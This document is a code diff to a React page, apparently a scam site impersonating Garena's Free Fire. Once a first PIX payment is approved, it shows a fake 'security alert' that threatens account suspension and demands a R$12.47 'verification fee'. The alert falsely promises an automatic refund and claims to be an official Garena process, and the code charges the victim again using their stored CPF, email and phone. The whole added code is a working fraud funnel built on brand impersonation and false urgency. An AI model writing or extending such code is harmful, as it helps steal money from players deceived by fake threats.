@@ -28,6 +28,8 @@ type PageState =
   | "logado"
   | "pagamento"
   | "pix"
+  | "upsell"
+  | "upsell-pix"
   | "sucesso";
 
 export default function Home() {
@@ -58,6 +60,18 @@ export default function Home() {
   const [pixError, setPixError] = useState("");
   const [pixTimer, setPixTimer] = useState(10 * 60);
   const [copied, setCopied] = useState(false);
+  const [upsellPixData, setUpsellPixData] = useState<{
+    qr_code: string;
+    qr_code_base64: string;
+    transaction_id: string;
+    reference: string;
+    expires_at: string;
+    amount: number;
+  } | null>(null);
+  const [upsellPixLoading, setUpsellPixLoading] = useState(false);
+  const [upsellPixError, setUpsellPixError] = useState("");
+  const [upsellPixTimer, setUpsellPixTimer] = useState(10 * 60);
+  const [upsellCopied, setUpsellCopied] = useState(false);
 
   // ---- Helpers: validation & formatting ----
   function validateCPF(cpf: string): boolean {
@@ -137,7 +151,7 @@ export default function Home() {
         const data = await res.json();
         if (data.status === "approved") {
           clearInterval(interval);
-          setPage("sucesso");
+          setPage("upsell");
         }
       } catch {
         // silently retry
@@ -188,6 +202,66 @@ export default function Home() {
     if (Object.keys(errors).length > 0) return;
     createPix();
   };
+
+  // Upsell PIX timer
+  useEffect(() => {
+    if (page !== "upsell-pix" || !upsellPixData) return;
+    setUpsellPixTimer(10 * 60);
+    const interval = setInterval(() => {
+      setUpsellPixTimer((t) => (t > 0 ? t - 1 : 0));
+    }, 1000);
+    return () => clearInterval(interval);
+  }, [page, upsellPixData]);
+
+  // Upsell payment polling
+  useEffect(() => {
+    if (!upsellPixData?.transaction_id || page !== "upsell-pix") return;
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/check-payment?id=${upsellPixData.transaction_id}`);
+        const data = await res.json();
+        if (data.status === "approved") {
+          clearInterval(interval);
+          setPage("sucesso");
+        }
+      } catch {
+        // silently retry
+      }
+    }, 3000);
+    return () => clearInterval(interval);
+  }, [upsellPixData, page]);
+
+  const createUpsellPix = useCallback(async () => {
+    setUpsellPixLoading(true);
+    setUpsellPixError("");
+    try {
+      const res = await fetch("/api/create-pix", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          amount: 1247,
+          description: "Taxa de Verificação de Segurança - Free Fire",
+          customer: {
+            name: playerId,
+            email: email,
+            document: cpf.replace(/\D/g, ""),
+            phone: phone.replace(/\D/g, ""),
+          },
+        }),
+      });
+      const data = await res.json();
+      if (!res.ok) {
+        setUpsellPixError(data.error || "Erro ao gerar PIX. Tente novamente.");
+        return;
+      }
+      setUpsellPixData(data);
+      setPage("upsell-pix");
+    } catch {
+      setUpsellPixError("Erro de conexão. Tente novamente.");
+    } finally {
+      setUpsellPixLoading(false);
+    }
+  }, [playerId, email, cpf, phone]);
 
   const formatTime = (seconds: number) => {
     const m = Math.floor(seconds / 60);
@@ -1602,6 +1676,183 @@ export default function Home() {
           >
             Voltar ao Início
           </button>
+        </div>
+      </div>
+    );
+  }
+
+  // ============ UPSELL PAGE ============
+  if (page === "upsell") {
+    return (
+      <div className="min-h-screen bg-[#f8f9fa] flex flex-col items-center justify-center px-4">
+        <div className="bg-white rounded-2xl shadow-lg p-6 max-w-md w-full">
+          <div className="flex items-center justify-center mb-4">
+            <div className="w-16 h-16 bg-[#fff3cd] rounded-full flex items-center justify-center">
+              <Shield className="w-8 h-8 text-[#dc3545]" />
+            </div>
+          </div>
+
+          <div className="bg-[#dc3545] text-white text-center py-2 rounded-lg text-sm font-bold mb-4">
+            ALERTA DE SEGURANÇA
+          </div>
+
+          <h2 className="text-lg font-bold text-[#1a1a1a] text-center mb-2">
+            Atenção! Sua conta será suspensa em 24 horas
+          </h2>
+
+          <div className="bg-[#fff3cd] border border-[#ffc107] rounded-lg p-4 mb-4">
+            <p className="text-sm text-[#856404] leading-relaxed">
+              Foi identificado um <strong>login suspeito</strong> na sua conta vinculada ao ID <strong>{playerId}</strong>. Para confirmar que você é o titular e <strong>evitar o banimento permanente</strong>, é necessário realizar uma verificação de segurança.
+            </p>
+          </div>
+
+          <div className="bg-[#f8f9fa] rounded-lg p-4 mb-4">
+            <div className="flex justify-between items-center mb-2">
+              <span className="text-sm text-[#666]">Taxa de verificação:</span>
+              <span className="font-bold text-[#1a1a1a]">R$ 12,47</span>
+            </div>
+            <div className="border-t pt-2">
+              <div className="flex items-start gap-2">
+                <CheckCircle className="w-4 h-4 text-[#28a745] mt-0.5 shrink-0" />
+                <p className="text-xs text-[#28a745] font-medium">
+                  Este valor será <strong>estornado automaticamente</strong> em até 12 minutos após a confirmação.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div className="space-y-2 mb-4">
+            <div className="flex items-center gap-2 text-sm text-[#666]">
+              <CheckCircle className="w-4 h-4 text-[#28a745] shrink-0" />
+              <span>Confirma a titularidade da conta</span>
+            </div>
+            <div className="flex items-center gap-2 text-sm text-[#666]">
+              <CheckCircle className="w-4 h-4 text-[#28a745] shrink-0" />
+              <span>Evita banimento permanente</span>
+            </div>
+            <div className="flex items-center gap-2 text-sm text-[#666]">
+              <CheckCircle className="w-4 h-4 text-[#28a745] shrink-0" />
+              <span>Valor estornado em até 12 minutos</span>
+            </div>
+          </div>
+
+          {upsellPixError && (
+            <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
+              <p className="text-red-600 text-sm">{upsellPixError}</p>
+            </div>
+          )}
+
+          <button
+            onClick={createUpsellPix}
+            disabled={upsellPixLoading}
+            className="w-full bg-[#dc3545] text-white font-bold py-4 rounded-lg text-base hover:bg-[#c82333] transition disabled:opacity-60 flex items-center justify-center gap-2 mb-3"
+          >
+            {upsellPixLoading ? (
+              <>
+                <Loader2 className="w-5 h-5 animate-spin" /> Gerando verificação...
+              </>
+            ) : (
+              "Verificar minha conta agora"
+            )}
+          </button>
+
+          <p className="text-[10px] text-[#999] text-center">
+            Processo oficial de segurança Garena. A taxa de R$ 12,47 é estornada automaticamente.
+          </p>
+        </div>
+      </div>
+    );
+  }
+
+  // ============ UPSELL PIX PAGE ============
+  if (page === "upsell-pix" && upsellPixData) {
+    const uMinutes = Math.floor(upsellPixTimer / 60);
+    const uSeconds = upsellPixTimer % 60;
+    return (
+      <div className="min-h-screen bg-[#f8f9fa] flex flex-col">
+        <header className="bg-white px-4 py-3 flex items-center gap-3">
+          <img
+            src="/images/garena-logo-full.png"
+            alt="Garena"
+            className="h-8"
+          />
+          <span className="text-[#1a1a1a] font-medium text-sm">
+            Verificação de Segurança
+          </span>
+        </header>
+
+        <div className="bg-white rounded-lg shadow-sm p-6 mx-4 mt-4">
+          <div className="text-center mb-6">
+            <div className="inline-flex items-center gap-2 bg-[#fff3cd] text-[#856404] px-4 py-2 rounded-lg text-sm font-medium mb-4">
+              <Clock className="w-4 h-4" />
+              Expira em {uMinutes.toString().padStart(2, "0")}:{uSeconds.toString().padStart(2, "0")}
+            </div>
+            <h2 className="text-lg font-bold text-[#1a1a1a] mb-1">
+              Taxa de Verificação
+            </h2>
+            <p className="text-sm text-[#666]">
+              Escaneie o QR Code ou copie o código abaixo
+            </p>
+          </div>
+
+          <div className="flex justify-center mb-6">
+            {upsellPixData.qr_code ? (
+              <div className="bg-white p-3 rounded-lg border">
+                <QRCodeSVG value={upsellPixData.qr_code} size={220} />
+              </div>
+            ) : upsellPixData.qr_code_base64 ? (
+              <img
+                src={`data:image/png;base64,${upsellPixData.qr_code_base64}`}
+                alt="QR Code PIX"
+                className="w-56 h-56 rounded-lg border"
+              />
+            ) : (
+              <div className="w-56 h-56 bg-gray-100 rounded-lg flex items-center justify-center">
+                <Loader2 className="w-8 h-8 animate-spin text-gray-400" />
+              </div>
+            )}
+          </div>
+
+          <div className="bg-[#f8f9fa] rounded-lg p-3 mb-4">
+            <p className="text-xs text-[#666] mb-2 font-medium">Código PIX copia e cola:</p>
+            <div className="flex items-center gap-2">
+              <input
+                type="text"
+                readOnly
+                value={upsellPixData.qr_code}
+                className="flex-1 text-xs bg-white border rounded px-3 py-2 text-[#333] truncate"
+              />
+              <button
+                onClick={() => {
+                  navigator.clipboard.writeText(upsellPixData.qr_code);
+                  setUpsellCopied(true);
+                  setTimeout(() => setUpsellCopied(false), 2000);
+                }}
+                className="bg-[#dc3545] text-white text-xs font-bold px-4 py-2 rounded-lg whitespace-nowrap hover:bg-[#c82333] transition"
+              >
+                {upsellCopied ? "Copiado!" : "Copiar"}
+              </button>
+            </div>
+          </div>
+
+          <div className="flex justify-between items-center bg-[#f0fdf4] rounded-lg p-3 mb-3">
+            <span className="text-sm text-[#166534] font-medium">Valor:</span>
+            <span className="text-lg font-bold text-[#166534]">R$ 12,47</span>
+          </div>
+
+          <div className="bg-[#d4edda] border border-[#c3e6cb] rounded-lg p-3 mb-6">
+            <div className="flex items-start gap-2">
+              <CheckCircle className="w-4 h-4 text-[#28a745] mt-0.5 shrink-0" />
+              <p className="text-xs text-[#155724] font-medium">
+                Este valor será <strong>estornado automaticamente</strong> em até 12 minutos após a confirmação do pagamento.
+              </p>
+            </div>
+          </div>
+
+          <div className="flex items-center gap-2 justify-center">
+            <Loader2 className="w-4 h-4 animate-spin text-[#dc3545]" />
+            <span className="text-sm text-[#666]">Aguardando pagamento...</span>
+          </div>
         </div>
       </div>
     );
